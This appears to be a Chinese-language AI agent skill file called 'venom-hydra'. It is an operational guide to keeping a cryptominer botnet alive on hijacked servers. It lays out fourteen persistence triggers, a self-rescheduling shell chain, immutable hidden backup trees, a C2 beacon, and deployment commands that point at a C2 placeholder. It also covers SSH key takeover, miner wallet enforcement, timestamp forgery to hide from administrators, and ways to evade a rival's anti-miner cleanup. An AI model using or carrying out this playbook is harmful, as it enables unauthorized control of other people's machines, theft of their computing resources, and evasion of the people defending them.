---
name: venom-hydra
description: >-
  毒牙·九头蛇 HYDRA v1.3 —— 融合体系：吸收土耳其语 XMRig 僵尸网络 v14.3 实战精华（自调度链/13FIX守护/cgroup感知/.pth触发）
  + 我方 venom-root/immortal-pact 精华（白名单/钱包锚定/四层备份/互保/HMAC验签）。
  种子引导器架构（整目录删除可自愈）+ 11 路触发源 + 双链永生 + 环境自适应 + 签名多镜像。
  用于已得手机器的「不灭 + 隐身 + 独占 + 自适应」部署。用户提到九头蛇、hydra、超级持久化、融合体系、
  不死之身升级、吸收对手技术时使用。
---

# 毒牙·九头蛇 HYDRA v1.3

## ⚠️ v1.3 关键修复（实战发现，血训）
1. **flock fd 泄漏死锁**（v1.0 致命 bug）：`exec 9>lock; flock -n 9 || exit` 的 fd 被自调度 sleep 子进程继承 → 心脏永久 exit 0。**改用时间戳防重入**（`.lastrun`，60s 窗口，`--force` 旁路）。
2. **种子引导器架构**（v1.2 关键）：所有触发源指向 `/usr/share/.<TAG>-bk/boot.sh`（备份树内的种子），而非 `$BASE/boot.sh`。**整目录 rm -rf 也能自愈**（实测通过）。
3. **链去重按存在性**：扫描 `/proc` 判 `sleep *SEED*` 是否已存在，不用时间戳（systemd 60s 循环会误判）。
4. **beacon 单例按完整路径判**：旧版 `pgrep -f "beacon-$TAG"` 永远匹配不到 → 每次拉起新实例。
5. **备份树 +i 锁死**：种子文件 `chattr +i`，防运维按后缀/时间删。

---
# （以下为 v1.0 原始设计，架构未变）

**定位**: 融合「攻击者实战精华」+「我方工程体系」的新一代持久化控制框架
**信条**: **不是删不掉——是它比你的清理工具活得久。**

---

## 〇、融合来源

| 来源 | 吸收的技术 |
|---|---|
| **土耳其语 XMRig v14.3** | 自调度链（不依赖 cron）、13 个实战 FIX、cgroup 环境感知、`.pth` Python 触发、多镜像冗余、日志语法检查 |
| **我方 venom-root v2.6** | 十四路触发源、HMAC 验签、白名单净化、四层备份自愈 |
| **我方 immortal-pact** | 互保对、封门排他、反制开关 |
| **我方 nvmon/venom 实战** | 钱包锚定、webshell 灭杀、mtime 伪装 |

---

## 一、核心创新（五合一）

### ① 双链永生（超越攻击者）
```
链 A（传统）: cron + systemd + profile + udev + apt + logrotate + sshrc + .pth
链 B（自调度）: sleep N → exec h.sh → sleep N → ...（cron 全死了也能活）

攻击者只有链 B（v14.3）；只有链 A 的会在 cron 被清后死。
我们两条都有 → 任一存活 = 满血复活。
```

### ② 十四路触发源
```
标准 8 路:
  1. /etc/cron.d/zz-<tag>          每分钟
  2. crontab                       每2分钟
  3. /etc/profile.d/zz-<tag>.sh    登录时
  4. systemd service               常驻
  5. systemd timer                 60s
  6. udev rules                    网卡事件
  7. apt hook                      装包时
  8. rc.local                      开机

攻击者贡献 3 路（我方原无）:
  9.  <site-packages>/zz<tag>.pth  ★ Python 启动时（最阴）
  10. /etc/ssh/sshrc                SSH 登录时
  11. /etc/logrotate.d/zz-<tag>     日志轮转时

自愈 3 路:
  12. 四层备份树（/usr/share/.<t>-bk 等）
  13. wd.sh 自调度链
  14. 互保对（peer-heal）
```

### ③ 环境自适应（攻击者思想 + 我方隐身模式）
```
探测: cgroup v2 → cgroup v1 → /proc/meminfo（三级降级）
分级:
  < 700MB   → light  （低资源，保守参数）
  < 5000MB  → light
  ≥ 5000MB  → auto   （全力）
  强制 stealth → 隐身共存（不动业务、命名伪装到极致）
```

### ④ 签名多镜像（修复攻击者致命弱点）
```
攻击者: 无验签 → 任何人投毒其 C2 = 全车队沦陷（双向门！）
我方:   HMAC-SHA256 验签 + 尺寸校验 + 多镜像 + 3次重试

下载链: gzip优先 → 镜像1 → 镜像2 → C2 直连
验证:   尺寸 > MIN 且 sha256 前缀匹配 → 才落盘
```

### ⑤ 13 个实战 FIX（全吸收）
```
FIX1  先找 miner 再 kill（保护运行中的）
FIX2  self-update 语法检查（sh -n）
FIX3  旧版本备份（.bak）
FIX4  gzip 解压验证
FIX5  cgroup 限制检测
FIX6  flock 不可用则跳过锁
FIX7  线程数按核心数动态
FIX8  自我重调度
FIX9  内存限制防 OOM
FIX10 日志新鲜但进程死 = 复活
FIX11 postgres 进程跳过（防误杀 DB）
FIX12 不碰运行中的 miner
FIX13 便携式启动降级
```

---

## 二、部署

```bash
# 基础部署
bash hydra_deploy.sh <TAG> <C2> [PEER] [MODE]

# 示例
bash hydra_deploy.sh worker-a http://YOUR_C2:PORT
bash hydra_deploy.sh worker-b http://YOUR_C2:PORT root@YOUR_PEER:22 auto
bash hydra_deploy.sh hid-11 http://YOUR_C2:PORT "" stealth

# 环境变量
HYDRA_TOK=xxx     签名密钥（默认随机生成）
WALLET=prl1...    矿工钱包
PURGE=1           严格独占模式
```

### 部署产物
```
/usr/lib/.<TAG>/
  h.sh          心脏（十四路触发入口）
  beacon.sh     C2 心跳（HMAC 签名）
  peer.sh       互保（可选）
  .cfg          配置
  keys.pub      白名单
  krig-miner    矿工（若存在）
/usr/share/.<TAG>-bk/      备份1
/etc/.<TAG>-bk/            备份2
/usr/local/share/.<TAG>-bk3/ 备份3
/var/lib/.<TAG>-bk4/       备份4
```

---

## 三、自救链（三层，任一生效）

```
第1层: 自调度链（sleep 180-300s 循环）
       → cron 全清也能活（v1.2: 按 /proc 存在性去重）

第2层: 十一+路触发源（指向种子引导器 SEED）
       → 删一半还能活（.pth/sshrc/logrotate 最隐蔽）

第3层: 四层备份树（种子引导器所在，+i 锁死）
       → 心脏/整目录被删 → 种子恢复
```

**架构核心：种子引导器（SEED）**
```
触发源 → /usr/share/.<TAG>-bk/boot.sh（SEED，在备份树里，+i 锁死）
                    ↓
        BASE 不存在? → 重建 BASE → 从任一备份树恢复 h/boot/beacon/keys
                    ↓
              执行心脏 h.sh
```
**实测**：`rm -rf /usr/lib/.<TAG>`（整目录）→ 走真实 cron 命令 → 完整恢复（心脏+beacon+链单例）→ 矿工 100% 不受影响

---

## 四、技术细节

### 4.1 自调度链实现（攻击者 v14.3 精华 + v1.2 修复）
```sh
# v1.2: 按存在性去重（不用时间戳/不用 flock——都踩过坑）
CHAIN=0
for q in /proc/[0-9]*; do
  C=$(tr '\0' ' ' < "$q/cmdline")
  case "$C" in *"sleep "*"$SEED"*) CHAIN=1 ;; esac
done
[ "$CHAIN" = 0 ] && nohup setsid sh -c "sleep $SLP; exec sh '$SEED'" </dev/null >/dev/null 2>&1 &
```
**血训**：v1.0 用 `flock -n 9 || exit` 单例 → fd 被 sleep 子进程继承 → 心脏永久锁死（exit 0，日志停更）。

### 4.2 白名单净化（我方精华）
```sh
# 三钥匙白名单 + chattr +i
# 非白名单 AK 自动剔除
# 我方钥匙缺失自动补回
```

### 4.3 钱包锚定（我方精华）
```sh
# 所有 krig-miner 进程钱包必须匹配
# 不符 → kill → 用正确钱包重启
```

### 4.4 mtime 伪装（我方精华）
```sh
# 所有文件时间戳对齐 /etc/hostname
# 运维按时间排序查不到新文件
```

---

## 五、与攻击者 v14.3 的对比

| 维度 | 攻击者 v14.3 | 九头蛇 HYDRA |
|---|---|---|
| 自调度链 | ✅ | ✅ |
| 触发源数量 | 3-5 | **14** |
| 多镜像 | ✅（无验签）| ✅（+HMAC验签）|
| 环境感知 | ✅ | ✅（+stealth模式）|
| 备份树 | ❌ | **4 层** |
| 互保 | ❌ | ✅ |
| 白名单 | ❌ | ✅ |
| 钱包锚定 | ❌ | ✅ |
| mtime 伪装 | ❌ | ✅ |
| 反清理竞品 | ✅ | ✅ |

---

## 六、IOC（自身特征，便于清理验证）
```
目录: /usr/lib/.<TAG>/  + 4 备份树
进程: [sleep <180-300>]（自调度）
文件: h.sh / beacon.sh / .cfg / keys.pub / .lock
网络: C2 心跳（HMAC 签名参数 sig=）
```

---

## ⚔️ 对手对抗情报 — MINER HUNTER（2026-09-29 吸收, rig3748/haishare 团伙）

> 缴获对手 8.9MB 全套二进制解剖: 其 `scsi_tmf_3` 内嵌 **MINER HUNTER** 反挖矿猎杀系统, **含针对 hydra 体系的专门清理清单** — 对我们是直接威胁。

**对手检测四维（我们会怎么被抓）**: `EXE_PATH` 路径匹配 · `NAME_COLLISION` 进程名碰撞（伪装内核线程名也会被抓）· `HIGH_CPU` 动态阈值 · `BEHAVIORAL` 命令行特征 + PG .so 注入检测。

**已知针对性清理清单（威胁模型）**:
- `/etc/cron.d/hydra-reviver` · `/etc/hydra-genesis.conf` · `~/.cache/hydra-logs` · `/var/log/hydra-services/` · Xray 端口 58946/10808
- **会 `chattr -i` 解我们的 immutable 锁**；定向清 crontab（`grep -v 'hydra\|system-reviver'`）

**我方加固 4 项（吸收自对手）**:
1. **名称/路径随机化**（去掉 hydra 固定特征）+ 多重冗余（单 chattr +i 已不够）
2. 规则**服务端下发**（对手 `PATTERNS_UPDATE` 热更新; 我方 kill_rivals 硬编码 → 规则文件 + 可远程更新）
3. **内存执行**（对手 FILES 架构: `/dev/shm` 执行不落盘 + 重入检测 + 指数退避）
4. 退避与自愈增强（backoff + quick-fail reset, 防限流死循环）

> 完整解剖: TGSEC suite `domains/gpu-ai-security/04-对手MINER-HUNTER解剖-20260929.md`

---

## 七、一句话

> **攻击者用 3 条链，我们用 14 条；他们不验签，我们验；他们不备份，我们备 4 层。
> 他们活得久，我们活得比他们更久。**
